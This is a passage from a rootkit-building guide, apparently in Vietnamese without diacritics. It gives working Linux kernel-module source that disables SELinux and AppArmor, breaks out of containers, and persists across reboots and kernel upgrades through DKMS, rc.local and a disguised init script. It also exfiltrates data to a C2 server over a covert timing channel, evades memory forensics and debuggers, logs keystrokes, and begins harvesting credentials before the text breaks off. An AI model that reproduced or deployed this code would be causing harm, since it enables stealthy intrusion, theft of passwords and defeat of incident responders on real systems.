**Deep Kernel Internals: SELinux va MAC Enforcement**

SELinux implement Mandatory Access Control (MAC) — lop access control BEN TREN Unix DAC (rwx permissions). Ngay ca root (UID 0) cung bi SELinux restrict neu policy khong cho phep.

Core mechanism: bien `selinux_enforcing` (global int). Gia tri 0 = permissive mode (chi log, khong block), 1 = enforcing mode (block violations). Rootkit chi can set `selinux_enforcing = 0` de vo hieu hoa toan bo SELinux enforcement.

Moi task co security context luu trong credential blob: `task->cred->security` tro toi SELinux context data (bao gom domain type, role, user). Neu set `cred->security = NULL`, nhieu SELinux check functions se early-return "allowed" vi khong co context de evaluate. Cach an toan hon: copy security blob tu `init_cred` (credentials cua PID 1, thuong la `unconfined_t` domain) de ke thua quyen unconfined.

AppArmor tuong tu nhung dung path-based policy thay vi label-based — moi file duoc identify theo pathname thay vi security label tren inode. AppArmor cung luu profile trong `cred->security`, va ky thuat bypass tuong tu.

```c
/* selinux_bypass.c — Bypass Mandatory Access Control
 *
 * SELinux enforce access control NGOAI Unix DAC (rwx permissions).
 * Ngay ca root cung bi SELinux restrict.
 *
 * Kernel-level bypass methods:
 *   1. Disable SELinux enforce mode
 *   2. Null security blob trong credentials
 *   3. Set process context thanh unconfined
 *   4. Modify selinux_enforcing variable truc tiep
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * Method 1: Disable SELinux enforce mode
 *
 * selinux_enforcing = global int variable.
 *   1 = enforcing (block violations)
 *   0 = permissive (log only, don't block)
 *
 * Equivalent: setenforce 0 (nhung tu kernel, khong can selinux tools).
 * ══════════════════════════════════════════════════════════════ */
static void rk_selinux_disable(void)
{
    int *enforcing;

    enforcing = (int *)rk_lookup_name("selinux_enforcing");
    if (enforcing) {
        *enforcing = 0;
        pr_info("rk: SELinux set to permissive\n");
    }

    /* Alternative: selinux_state structure (kernel 5.x+)
     *
     * struct selinux_state co field .enforcing.
     * Neu selinux_enforcing khong ton tai (newer kernels):
     */
    void *state = (void *)rk_lookup_name("selinux_state");
    if (state) {
        /* struct selinux_state {
         *     bool disabled;
         *     bool enforcing;  // offset varies by kernel version
         *     ...
         * };
         * Hack: scan for enforcing field */
        bool *disabled = (bool *)state;
        *disabled = true;  /* selinux_state.disabled = true */
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 2: Null credential security blob
 *
 * Moi struct cred co `void *security` field.
 * LSM (SELinux/AppArmor) stores context info tai day.
 *
 * Neu security = NULL -> LSM checks tra ve "allowed"
 * (nhieu SELinux check functions early-return khi NULL).
 *
 * Hoac: copy security blob tu init_cred (PID 1, unconfined).
 * ══════════════════════════════════════════════════════════════ */
static void rk_bypass_lsm_for_current(void)
{
    struct cred *cred;
    const struct cred *init_cred_ptr;

    /* Get init process credentials (PID 1 = unconfined context) */
    init_cred_ptr = (const struct cred *)rk_lookup_name("init_cred");

    cred = (struct cred *)current->cred;

    if (init_cred_ptr && init_cred_ptr->security) {
        /* Copy init_cred's security blob -> current gets unconfined context */
        cred->security = init_cred_ptr->security;
    } else {
        /* Fallback: NULL security blob */
        cred->security = NULL;
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 3: AppArmor bypass
 *
 * AppArmor stores profile info trong task->security.
 * Moi profile define allowed operations.
 *
 * "unconfined" profile = no restrictions.
 * Set current task's AppArmor profile -> unconfined.
 * ══════════════════════════════════════════════════════════════ */
static void rk_apparmor_bypass(void)
{
    /* AppArmor uses cred->security to store aa_label.
     * aa_label contains current profile.
     *
     * Approach: set cred->security toi unconfined label.
     * unconfined label = root_ns->unconfined trong AppArmor. */
    rk_bypass_lsm_for_current();
}
```

---

### C.2 Namespace Escape

**Deep Kernel Internals: Linux Namespaces va Container Isolation**

Moi process co `struct nsproxy` chua pointers toi tat ca namespaces cua no:

```
struct nsproxy {
    struct uts_namespace  *uts_ns;             // hostname, domainname
    struct ipc_namespace  *ipc_ns;             // System V IPC, POSIX message queues
    struct mnt_namespace  *mnt_ns;             // mount points (filesystem view)
    struct pid_namespace  *pid_ns_for_children; // PID number space
    struct net            *net_ns;             // network stack (interfaces, routes, iptables)
    struct time_namespace *time_ns;            // clock offsets (kernel 5.6+)
    struct cgroup_namespace *cgroup_ns;        // cgroup root view
};
```

Container (Docker, LXC, Podman) = process co nsproxy tro toi cac **isolated namespace instances** thay vi host namespaces. Vi du, container process co `mnt_ns` rieng chi thay filesystem cua container, `pid_ns` rieng chi thay PIDs trong container.

Container escape tu kernel: swap `current->nsproxy` voi `init_nsproxy` (nsproxy cua PID 1 — host system). Dong thoi swap `current->fs->root` voi init's root de thoat khoi chroot cua container. Sau khi swap, process trong container co the thay toan bo host filesystem va network.

```c
/* namespace_escape.c — Escape Linux namespaces (container breakout)
 *
 * Containers (Docker, LXC, Podman) = process isolation via namespaces:
 *   PID namespace:    process chi thay PIDs trong cung namespace
 *   NET namespace:    isolated network stack
 *   MNT namespace:    isolated filesystem mounts
 *   UTS namespace:    isolated hostname
 *   USER namespace:   UID/GID mapping
 *   IPC namespace:    isolated IPC objects
 *
 * Container breakout tu kernel: switch sang init namespace
 * (namespace cua host system PID 1).
 *
 * Khi rootkit module load TRONG container (can CAP_SYS_MODULE):
 *   -> Module chay trong kernel space = shared boi tat ca containers
 *   -> Nhung current task thuoc container namespace
 *   -> Switch namespace -> escape container isolation
 */

#include "rootkit.h"
#include <linux/nsproxy.h>     /* nsproxy, task_struct->nsproxy */
#include <linux/pid_namespace.h>
#include <linux/fs_struct.h>   /* task_struct->fs */
#include <linux/mount.h>

/* -- Switch process vao init namespace --
 *
 * Moi process co nsproxy struct chua pointers toi tat ca namespaces:
 *   struct nsproxy {
 *       struct uts_namespace  *uts_ns;
 *       struct ipc_namespace  *ipc_ns;
 *       struct mnt_namespace  *mnt_ns;
 *       struct pid_namespace  *pid_ns_for_children;
 *       struct net            *net_ns;
 *       struct cgroup_namespace *cgroup_ns;
 *   };
 *
 * init_nsproxy = nsproxy cua PID 1 (host system).
 * Switch current->nsproxy -> init_nsproxy = escape container.
 */
static void rk_escape_namespaces(void)
{
    struct nsproxy *init_nsp;
    struct fs_struct *init_fs, *cur_fs;
    struct path old_root, old_pwd;

    /* Lay init_nsproxy va init_fs — namespace set va fs_struct cua host */
    init_nsp = (struct nsproxy *)rk_lookup_name("init_nsproxy");
    init_fs = (struct fs_struct *)rk_lookup_name("init_fs");
    if (!init_nsp || !init_fs) {
        pr_err("rk: cannot find init_nsproxy or init_fs\n");
        return;
    }

    /* Swap nsproxy with proper locking.
     *
     * task_lock(current) phai acquire truoc khi modify current->nsproxy.
     * Tranh race condition voi signal delivery va other nsproxy readers.
     */
    task_lock(current);
    {
        struct nsproxy *old = current->nsproxy;
        get_nsproxy(init_nsp);
        rcu_assign_pointer(current->nsproxy, init_nsp);
        put_nsproxy(old);
    }
    task_unlock(current);
    pr_info("rk: escaped to init namespaces\n");

    /* Switch filesystem root — container co chroot vao /container/root.
     * Phai switch fs->root toi host root de thay full filesystem.
     *
     * init_task->fs->root = host root filesystem.
     *
     * QUAN TRONG: phai path_put() tren old values SAU khi set new values.
     * Khong path_put -> dentry/vfsmount leak (reference count never decremented).
     */
    cur_fs = current->fs;
    spin_lock(&cur_fs->lock);

    /* Save old paths truoc khi overwrite */
    old_root = cur_fs->root;
    old_pwd = cur_fs->pwd;

    /* Set new paths (init's root) */
    cur_fs->root = init_fs->root;
    path_get(&cur_fs->root);
    cur_fs->pwd = init_fs->root;
    path_get(&cur_fs->pwd);

    spin_unlock(&cur_fs->lock);

    /* Release old path references AFTER unlock */
    path_put(&old_root);
    path_put(&old_pwd);

    pr_info("rk: filesystem root switched to host\n");
}
```

---

## Appendix D: Advanced Persistence

### D.1 DKMS Persistence

```c
/* dkms_persist.c — DKMS auto-rebuild across kernel upgrades
 *
 * DKMS (Dynamic Kernel Module Support):
 *   - Framework tu dong rebuild kernel module khi kernel update
 *   - Dung boi NVIDIA drivers, VirtualBox, ZFS
 *   - Module source o /usr/src/MODULE-VERSION/
 *   - dkms.conf define build instructions
 *   - apt/dnf kernel upgrade trigger -> DKMS rebuild all registered modules
 *
 * Vi sao DKMS quan trong cho persistence:
 *   Tat ca persistence methods khac dung .ko file compiled cho
 *   SPECIFIC kernel version. Kernel upgrade -> .ko incompatible -> rootkit die.
 *   DKMS TU DONG recompile -> survive kernel upgrade.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void persist_dkms(const char *module_name,
                          const char *source_dir)
{
    char cmd[4096];

    snprintf(cmd, sizeof(cmd),
        /* 1. Tao DKMS source directory */
        "mkdir -p /usr/src/%s-1.0; "

        /* 2. Copy source files vao DKMS directory */
        "cp %s/*.c %s/*.h %s/Makefile /usr/src/%s-1.0/ 2>/dev/null; "

        /* 3. Tao dkms.conf */
        "cat > /usr/src/%s-1.0/dkms.conf << 'DKMSEOF'\n"
        "PACKAGE_NAME=\"%s\"\n"
        "PACKAGE_VERSION=\"1.0\"\n"
        "BUILT_MODULE_NAME[0]=\"%s\"\n"
        "DEST_MODULE_LOCATION[0]=\"/extra\"\n"
        "AUTOINSTALL=\"yes\"\n"
        "MAKE[0]=\"make -C /lib/modules/${kernelver}/build "
        "M=${dkms_tree}/${PACKAGE_NAME}/${PACKAGE_VERSION}/build modules\"\n"
        "CLEAN=\"make -C /lib/modules/${kernelver}/build "
        "M=${dkms_tree}/${PACKAGE_NAME}/${PACKAGE_VERSION}/build clean\"\n"
        "DKMSEOF\n"

        /* 4. Add module toi DKMS */
        "dkms add -m %s -v 1.0 2>/dev/null; "

        /* 5. Build cho current kernel */
        "dkms build -m %s -v 1.0 2>/dev/null; "

        /* 6. Install — auto-load at boot */
        "dkms install -m %s -v 1.0 2>/dev/null; "

        /* 7. Verify */
        "dkms status %s 2>/dev/null",

        module_name,
        source_dir, source_dir, source_dir, module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

### D.2 Boot Script Modification

```c
/* boot_script.c — Legacy boot script persistence
 *
 * Cho he thong KHONG dung systemd (hoac dung ket hop).
 */

#include "rootkit.h"
#include <linux/kmod.h>

/* -- Method 1: /etc/rc.local --
 * Legacy phuong phap, van hoat dong tren nhieu distros.
 * rc.local chay scripts cuoi cung trong boot sequence.
 */
static void persist_rc_local(const char *module_name)
{
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        /* Tao rc.local neu chua co (mot so distro moi khong co san) */
        "touch /etc/rc.local; "
        "chmod +x /etc/rc.local; "
        /* Them shebang neu chua co */
        "head -1 /etc/rc.local | grep -q '^#!/' || "
        "sed -i '1i #!/bin/bash' /etc/rc.local; "
        /* Them modprobe command TRUOC 'exit 0' (neu co) */
        "grep -q 'modprobe %s' /etc/rc.local || "
        "sed -i '/^exit 0/i /sbin/modprobe %s' /etc/rc.local; "
        /* Neu khong co 'exit 0': append */
        "grep -q 'modprobe %s' /etc/rc.local || "
        "echo '/sbin/modprobe %s' >> /etc/rc.local",
        module_name, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* -- Method 2: SysV init script -- */
static void persist_sysv_init(const char *module_name)
{
    char cmd[2048];

    snprintf(cmd, sizeof(cmd),
        "cat > /etc/init.d/%s << 'INITEOF'\n"
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          %s\n"
        "# Required-Start:    $local_fs\n"
        "# Required-Stop:\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:      0 1 6\n"
        "# Description:       Hardware firmware helper\n"
        "### END INIT INFO\n"
        "case \"$1\" in\n"
        "  start) /sbin/modprobe %s 2>/dev/null ;;\n"
        "  stop)  /sbin/rmmod %s 2>/dev/null ;;\n"
        "  *) echo \"Usage: $0 {start|stop}\" ;;\n"
        "esac\n"
        "INITEOF\n"
        "chmod +x /etc/init.d/%s; "
        "update-rc.d %s defaults 2>/dev/null; "
        "chkconfig --add %s 2>/dev/null",
        module_name, module_name, module_name,
        module_name, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

## Appendix E: Advanced C2

### E.1 Covert Timing Channel

```c
/* timing_channel.c — Covert timing channel
 *
 * Encode data KHONG trong packet content ma trong THOI GIAN
 * giua cac packets.
 *
 * Concept:
 *   Bit 1: delay 100ms roi send packet
 *   Bit 0: delay 50ms roi send packet
 *   Receiver measure inter-packet timing -> decode bits.
 *
 * Uu diem:
 *   - Packet content hoan toan binh thuong (ICMP ping, HTTP, DNS)
 *   - Deep packet inspection KHONG phat hien (content clean)
 *   - Chi timing analysis moi detect duoc
 *   - Bandwidth thap nhung stealth cuc cao
 *
 * Nhuoc diem:
 *   - Bandwidth rat thap (~10 bits/second)
 *   - Network jitter gay noise -> can error correction
 *   - Can synchronized clock hoac preamble
 */

#include "rootkit.h"
#include <linux/delay.h>
#include <net/sock.h>

#define TIMING_BIT_1_MS  100   /* Delay cho bit 1 */
#define TIMING_BIT_0_MS   50   /* Delay cho bit 0 */
#define TIMING_SYNC_MS   200   /* Sync pulse (start of byte) */

/* -- Send single bit qua timing -- */
static int timing_send_bit(struct socket *sock,
                            struct sockaddr_in *dest,
                            int bit)
{
    /* Delay = encode bit value */
    msleep(bit ? TIMING_BIT_1_MS : TIMING_BIT_0_MS);

    /* Send innocuous packet (ICMP ping hoac DNS query) */
    char payload[] = "AAAA";
    struct msghdr msg = { 0 };
    struct kvec iov = { .iov_base = payload, .iov_len = 4 };
    msg.msg_name = dest;
    msg.msg_namelen = sizeof(*dest);

    return kernel_sendmsg(sock, &msg, &iov, 1, 4);
}

/* -- Send byte (8 bits) qua timing channel -- */
static int timing_send_byte(struct socket *sock,
                              struct sockaddr_in *dest,
                              unsigned char byte)
{
    int i;

    /* Sync pulse: longer delay signals start of byte.
     * Receiver calibrate timing tu sync pulse. */
    msleep(TIMING_SYNC_MS);

    /* MSB first */
    for (i = 7; i >= 0; i--) {
        int bit = (byte >> i) & 1;
        timing_send_bit(sock, dest, bit);
    }

    return 0;
}

/* -- Exfiltrate data qua timing channel -- */
static int rk_timing_exfil(__be32 c2_ip, __be16 c2_port,
                             const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in dest;
    const unsigned char *bytes = data;
    int i, ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM,
                            IPPROTO_UDP, &sock);
    if (ret < 0) return ret;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = c2_ip;
    dest.sin_port = c2_port;

    /* Send length header (4 bytes) */
    for (i = 0; i < 4; i++)
        timing_send_byte(sock, &dest, (data_len >> (24 - i * 8)) & 0xFF);

    /* Send data bytes */
    for (i = 0; i < data_len; i++) {
        timing_send_byte(sock, &dest, bytes[i]);

        /* Yield CPU periodically — prevent soft lockup warning.
         * schedule() cho phep kernel chay other tasks. */
        if (i % 10 == 0)
            schedule();
    }

    sock_release(sock);
    return 0;
}
```

---

## Appendix F: Advanced Anti-Forensics

### F.1 Code Integrity Self-Check

```c
/* code_integrity.c — Rootkit tu kiem tra code integrity
 *
 * Detect neu analyst hoac tool da patch/modify rootkit code:
 *   - Breakpoint (0xCC INT3) inject boi debugger
 *   - Byte modification boi LKRG hoac manual patching
 *   - Function redirection (hook on our hooks)
 *
 * Method: hash rootkit code pages, periodically verify.
 */

#include "rootkit.h"
#include <crypto/hash.h>       /* shash API */

#define HASH_ALGO  "sha256"
#define HASH_SIZE  32   /* SHA-256 = 32 bytes */

static u8 code_hash_saved[HASH_SIZE];
static bool hash_initialized = false;

/* -- Compute SHA-256 hash of module code section -- */
static int compute_module_hash(u8 *hash_out)
{
    struct crypto_shash *tfm;
    struct shash_desc *desc;
    int desc_size, ret;
    void *code_start;
    unsigned int code_size;

    /* Module code location:
     *   MOD_BASE(THIS_MODULE) = start of module memory
     *   MOD_SIZE(THIS_MODULE) = size of code (.text) section
     *   (Compat macros defined trong rootkit.h — kernel 6.4+ support)
     *
     * Chi hash code section (khong hash data — data thay doi binh thuong). */
    code_start = MOD_BASE(THIS_MODULE);
    code_size  = MOD_SIZE(THIS_MODULE);

    /* Allocate SHA-256 transform */
    tfm = crypto_alloc_shash(HASH_ALGO, 0, 0);
    if (IS_ERR(tfm)) return PTR_ERR(tfm);

    desc_size = sizeof(*desc) + crypto_shash_descsize(tfm);
    desc = kzalloc(desc_size, GFP_KERNEL);
    if (!desc) {
        crypto_free_shash(tfm);
        return -ENOMEM;
    }
    desc->tfm = tfm;

    /* Compute hash */
    ret = crypto_shash_init(desc);
    if (ret) goto out;

    ret = crypto_shash_update(desc, code_start, code_size);
    if (ret) goto out;

    ret = crypto_shash_final(desc, hash_out);

out:
    kfree(desc);
    crypto_free_shash(tfm);
    return ret;
}

/* -- Initialize: save hash ngay sau module load -- */
int rk_integrity_init(void)
{
    int ret = compute_module_hash(code_hash_saved);
    if (ret == 0)
        hash_initialized = true;
    return ret;
}

/* -- Verify: so sanh hash hien tai voi saved --
 *
 * Goi periodically tu watchdog thread.
 * Neu mismatch -> code da bi tamper.
 */
bool rk_integrity_check(void)
{
    u8 current_hash[HASH_SIZE];
    int ret;

    if (!hash_initialized)
        return true;

    ret = compute_module_hash(current_hash);
    if (ret)
        return true;  /* Hash fail -> assume OK (crash prevention) */

    if (memcmp(current_hash, code_hash_saved, HASH_SIZE) != 0) {
        pr_err("rk: CODE INTEGRITY VIOLATION DETECTED\n");

        /* Response options:
         * 1. Re-patch: restore original code tu backup
         * 2. Self-destruct: remove traces and unload
         * 3. Alert: notify C2 server
         * 4. Evade: change behavior (go silent)
         */
        return false;
    }

    return true;  /* Integrity OK */
}

/* -- Scan for breakpoints (0xCC INT3) trong code section -- */
bool rk_detect_breakpoints(void)
{
    unsigned char *code = MOD_BASE(THIS_MODULE);
    unsigned int size = MOD_SIZE(THIS_MODULE);
    unsigned int i;
    int bp_count = 0;

    for (i = 0; i < size; i++) {
        if (code[i] == 0xCC) {
            bp_count++;
            /* 0xCC co the la legitimate instruction (aligned nop)
             * nhung nhieu 0xCC = debugger breakpoints. */
        }
    }

    /* Threshold: >3 breakpoints = likely debugger */
    if (bp_count > 3) {
        pr_err("rk: %d breakpoints detected in code!\n", bp_count);
        return true;
    }

    return false;
}
```

---

### F.2 Memory Forensics Evasion

```c
/* memory_evasion.c — Evade memory forensics tools
 *
 * Memory forensics tools (Volatility, Rekall) dump RAM va analyze:
 *   - Module list traversal (find hidden modules)
 *   - Syscall table verification (detect hooks)
 *   - Process list cross-referencing
 *   - String/signature scanning in memory
 *
 * Evasion techniques:
 *   1. Clear sensitive strings tu module memory
 *   2. Relocate code ngoai module address range
 *   3. Manipulate module metadata structures
 *   4. Clear freed slab caches (destroy forensic artifacts)
 *   5. Detect LiME (memory dump tool) loading
 */

#include "rootkit.h"
#include <linux/vmalloc.h>
#include <linux/slab.h>

/* ══════════════════════════════════════════════════════════════
 * Technique 1: Scrub strings tu module memory
 *
 * Volatility signature scan tim strings: "rootkit", "hidden",
 * "sys_call_table", magic values, etc.
 *
 * Sau khi init xong: zero out strings khong con can.
 * Giu lai function pointers (code van can).
 * ══════════════════════════════════════════════════════════════ */
static void rk_scrub_module_strings(void)
{
    /* Module .rodata section chua string literals.
     *
     * Kernel < 6.4: core_layout.base/text_size/ro_size
     * Kernel 6.4+:  mem[MOD_TEXT]/mem[MOD_RODATA]
     *
     * .rodata nam tu text_size -> ro_size (pre-6.4)
     * hoac mem[MOD_RODATA].base / .size (6.4+). */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    unsigned long rodata_start =
        (unsigned long)THIS_MODULE->mem[MOD_RODATA].base;
    unsigned long rodata_size = THIS_MODULE->mem[MOD_RODATA].size;
#else
    unsigned long rodata_start =
        (unsigned long)THIS_MODULE->core_layout.base +
        THIS_MODULE->core_layout.text_size;
    unsigned long rodata_size =
        THIS_MODULE->core_layout.ro_size -
        THIS_MODULE->core_layout.text_size;
#endif

    /* Make rodata writable temporarily */
    set_memory_rw(rodata_start & PAGE_MASK,
                   (rodata_size >> PAGE_SHIFT) + 1);

    /* Zero specific patterns — NOT toan bo (se crash vi
     * mot so strings van duoc reference). */
    char *scan = (char *)rodata_start;
    unsigned long i;
    for (i = 0; i < rodata_size - 8; i++) {
        /* Zero out sensitive strings */
        if (memcmp(scan + i, "rootkit", 7) == 0 ||
            memcmp(scan + i, "rk_hook", 7) == 0 ||
            memcmp(scan + i, "backdoor", 8) == 0)
            memset(scan + i, 0, 8);
    }

    /* Restore read-only */
    set_memory_ro(rodata_start & PAGE_MASK,
                   (rodata_size >> PAGE_SHIFT) + 1);
}

/* ══════════════════════════════════════════════════════════════
 * Technique 2: Relocate hook handlers ngoai module range
 *
 * Volatility kiem tra: "does syscall table entry point INTO
 * a known module address range?"
 * Neu entry tro vao module range -> flagged.
 * Neu entry tro vao vmalloc range ma KHONG thuoc module -> stealth.
 *
 * Copy hook function code vao vmalloc'd executable memory.
 * Syscall table entry tro toi vmalloc region.
 * Volatility thay entry tro ra ngoai module list -> confused.
 * ══════════════════════════════════════════════════════════════ */
static void *rk_relocate_handler(void *original_handler,
                                   unsigned int handler_size)
{
    void *relocated;

    /* Allocate executable memory NGOAI module range.
     *
     * __vmalloc: allocate voi specific flags.
     * PAGE_KERNEL_EXEC: readable + writable + executable.
     *
     * Memory nam trong vmalloc range (0xffffc90000000000...)
     * nhung KHONG thuoc bat ky module nao.
     */
    relocated = __vmalloc(handler_size, GFP_KERNEL);
    if (!relocated) return NULL;

    /* Copy handler code */
    memcpy(relocated, original_handler, handler_size);

    /* Make executable */
    set_memory_x((unsigned long)relocated & PAGE_MASK,
                  (handler_size >> PAGE_SHIFT) + 1);

    return relocated;
}

/* ══════════════════════════════════════════════════════════════
 * Technique 3: Detect LiME module loading
 *
 * LiME (Linux Memory Extractor) = kernel module dump RAM.
 * Neu LiME load -> analyst dang acquire memory dump.
 *
 * Detection: monitor module loading events.
 * Response: cleanup sensitive data TRUOC dump hoan thanh.
 * ══════════════════════════════════════════════════════════════ */
static int rk_module_notify(struct notifier_block *nb,
                              unsigned long action, void *data)
{
    struct module *mod = data;

    if (action == MODULE_STATE_COMING) {
        /* Module dang load. Check ten. */
        if (strstr(mod->name, "lime") ||
            strstr(mod->name, "avml") ||
            strstr(mod->name, "pmem") ||
            strstr(mod->name, "fmem")) {
            pr_info("rk: memory acquisition tool detected: %s\n",
                    mod->name);

            /* EMERGENCY: scrub sensitive data */
            rk_scrub_module_strings();
        }
    }

    return NOTIFY_DONE;
}

static struct notifier_block rk_mod_nb = {
    .notifier_call = rk_module_notify,
    .priority = INT_MAX,  /* Run FIRST */
};

/* Register: register_module_notifier(&rk_mod_nb);
 * Unregister: unregister_module_notifier(&rk_mod_nb); */
```

---

## Appendix G: Credential Theft

### G.1 Keylogger

**Deep Kernel Internals: Keyboard Input Path trong Linux Kernel**

Keyboard input di qua nhieu layers truoc khi den userspace:

```
Hardware IRQ (IRQ 1) -> atkbd driver -> input_event()
  -> keyboard input handler -> kbd_event() -> kbd_keycode()
    -> keyboard notifier chain (day la noi rootkit hook)

Notifier types khi keyboard event fire:
  KBD_KEYCODE        — raw scancode tu hardware (chua qua keymap)
  KBD_UNBOUND_KEYCODE — scancode khong co mapping trong keymap
  KBD_UNICODE         — Unicode character (sau khi compose/dead key processing)
  KBD_KEYSYM          — translated keysym (sau keymap lookup, SAU shift/capslock)
```

Rootkit hook `KBD_KEYSYM` vi `param->value` la gia tri character cuoi cung sau tat ca translation. Voi printable ASCII range (0x20-0x7E), keysym value = ASCII code truc tiep — vi du keysym 0x41 = 'A', 0x61 = 'a'. Keyboard notifier chay trong **interrupt context** (hardirq), nen khong the goi file I/O truc tiep — phai dung workqueue de defer viec ghi file.

```c
/* keylogger.c — Kernel-level keyboard input interception
 *
 * 2 methods:
 *   A) Input subsystem handler (input_register_handler)
 *   B) TTY layer hook (tty_operations read/write)
 *
 * Method A uu tien vi:
 *   - Capture ALL keyboard input (including passwords, SSH)
 *   - Co keycodes truoc moi userspace processing
 *   - Kernel API chinh thuc, stable across versions
 *   - Hoat dong cho ca virtual terminals va X11/Wayland
 */

#include "rootkit.h"
#include <linux/input.h>     /* input_dev, input_handler, input_event */
#include <linux/keyboard.h>  /* keyboard notifier */

/* ══════════════════════════════════════════════════════════════
 * Method A: Keyboard notifier
 *
 * Linux input subsystem:
 *   Hardware (keyboard) -> input_dev -> input_handler -> userspace
 *
 * register_keyboard_notifier: API nhan moi keyboard events.
 * Simpler than input_handler — chi cho keyboard, khong can
 * match input devices.
 *
 * Key event types:
 *   KBD_KEYSYM = translated keysym value
 *   KBD_KEYCODE = raw scancode
 *
 * Dung KBD_KEYSYM vi param->value = Unicode/ASCII keysym value
 * truc tiep. Cho printable ASCII (0x20-0x7E), keysym = ASCII code.
 * ══════════════════════════════════════════════════════════════ */

#define LOG_BUF_SIZE 4096
static char key_buf[LOG_BUF_SIZE];
static int key_buf_pos = 0;
static DEFINE_SPINLOCK(key_lock);

/* Deferred write buffer — keyboard notifier chay trong interrupt context,
 * khong the goi filp_open/kernel_write truc tiep.
 * Copy vao deferred buffer -> workqueue ghi file. */
static char deferred_buf[LOG_BUF_SIZE];
static int deferred_len = 0;
static DEFINE_SPINLOCK(defer_lock);

static void keylog_work_fn(struct work_struct *work);
static DECLARE_WORK(keylog_work, keylog_work_fn);

/* -- Keyboard notifier callback -- */
static int rk_keyboard_notify(struct notifier_block *nb,
                                unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;

    /* KBD_KEYSYM: param->value = Unicode/ASCII keysym value.
     * For printable ASCII: value = ASCII code directly. */
    if (action != KBD_KEYSYM || !param->down)
        return NOTIFY_DONE;

    unsigned int keysym = param->value;
    char ch = 0;

    /* Keysym to character conversion.
     * For basic ASCII (0x20-0x7E), keysym = ASCII value. */
    if (keysym >= 0x20 && keysym <= 0x7E) {
        ch = (char)keysym;
    } else if (keysym == 0x0D || keysym == 0x0A) {
        ch = '\n';
    } else if (keysym == 0x09) {
        ch = '\t';
    } else if (keysym == 0x08 || keysym == 0x7F) {
        ch = '\b';
    } else {
        return NOTIFY_DONE;  /* Non-printable, skip */
    }

    /* Append to buffer */
    spin_lock(&key_lock);
    if (key_buf_pos < LOG_BUF_SIZE - 1)
        key_buf[key_buf_pos++] = ch;
    spin_unlock(&key_lock);

    /* Flush buffer khi full hoac ENTER pressed */
    if (key_buf_pos > LOG_BUF_SIZE - 64 || ch == '\n') {
        spin_lock(&defer_lock);
        memcpy(deferred_buf, key_buf, key_buf_pos);
        deferred_len = key_buf_pos;
        key_buf_pos = 0;
        spin_unlock(&defer_lock);
        schedule_work(&keylog_work);
    }

    return NOTIFY_DONE;
}

static struct notifier_block rk_kb_nb = {
    .notifier_call = rk_keyboard_notify,
};

/* -- Workqueue handler: copy buffer under lock, then write --
 *
 * Keyboard notifier chay trong interrupt context.
 * Workqueue chay trong process context -> co the goi file I/O.
 * Copy deferred_buf to local buffer duoi spin_lock truoc khi write.
 */
static void keylog_work_fn(struct work_struct *work)
{
    struct file *f;
    char local_buf[LOG_BUF_SIZE];
    int local_len;

    /* Copy under lock — tranh race voi keyboard notifier */
    spin_lock(&defer_lock);
    if (deferred_len <= 0) {
        spin_unlock(&defer_lock);
        return;
    }
    local_len = deferred_len;
    memcpy(local_buf, deferred_buf, local_len);
    deferred_len = 0;
    spin_unlock(&defer_lock);

    /* Write LOCAL copy — no race possible */
    f = filp_open("/tmp/.rk_keys", O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (!IS_ERR(f)) {
        kernel_write(f, local_buf, local_len, &f->f_pos);
        filp_close(f, NULL);
    }
}

/* Install: register_keyboard_notifier(&rk_kb_nb);
 * Remove:  unregister_keyboard_notifier(&rk_kb_nb);
 *          cancel_work_sync(&keylog_work); */
```

---

### G.2 Credential Harvesting (TTY Sniffing)

```c
/* cred_harvest.c — Intercept authentication credentials
 *
 * Target functions:
 *   1. pam_authenticate -> PAM-based auth (SSH, sudo, login, su)
 *   2. unix_verify_password -> /etc/shadow password check
 *   3. crypto hash compare -> generic credential check
 *
 * Approach: Kprobe on authentication functions, extract
 * username + password TRUOC hash/verify.
 *
 * APT relevance: moi APT kit thu thap credentials.
 * Credentials = lateral movement capability.
 */

#include "rootkit.h"
#include <linux/kprobes.h>

#define CRED_LOG_PATH "/tmp/.rk_creds"

/* -- Log captured credential -- */
static void rk_log_credential(const char *source,
                                const char *username,
                                const char *password)
{
    struct file *f;
    char buf[512];
    loff_t pos = 0;
    int len;

    len = snprintf(buf, sizeof(buf), "[%s] user=%s pass=%s\n",
                   source, username, password ? password : "(null)");

    f = filp_open(CRED_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (!IS_ERR(f)) {
        kernel_write(f, buf, len, &pos);
        filp_close(f, NULL);
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 1: Hook sys_openat cho /etc/shadow reads
 *
 * Khi PAM authenticate: no read /etc/shadow.
 * Detect: monitor openat() cho /etc/shadow -> log calling process.
 * Khong capture password truc tiep nhung identify auth attempts.
 * ══════════════════════════════════════════════════════════════ */

/* ══════════════════════════════════════════════════════════════
 * Method 2: TTY sniffing via kretprobe — Capture password tu SSH/sudo
 *
